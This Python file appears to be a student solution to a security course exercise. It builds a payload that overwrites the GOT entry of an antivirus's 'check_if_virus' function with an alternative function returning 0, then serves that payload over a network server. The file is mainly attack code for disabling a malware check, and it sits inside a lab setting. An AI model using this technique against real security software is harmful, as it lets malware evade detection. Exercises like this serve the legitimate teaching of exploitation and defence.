import addresses
import evasion
import sys


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
       
        file = open(PATH_TO_TEMPLATE,'rb')
        payload = bytearray(file.read())
        
        #Get real values
        process_id = pid.to_bytes(4, byteorder = sys.byteorder)
        got_address = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT)
        alternative_address = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)
        
        #Replace placeholders
        payload = payload.replace(addresses.address_to_bytes(0x12345678), process_id)
        payload = payload.replace(addresses.address_to_bytes(0x11111111), got_address)
        payload = payload.replace(addresses.address_to_bytes(0x22222222), alternative_address)
        
        return bytes(payload)
       


    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
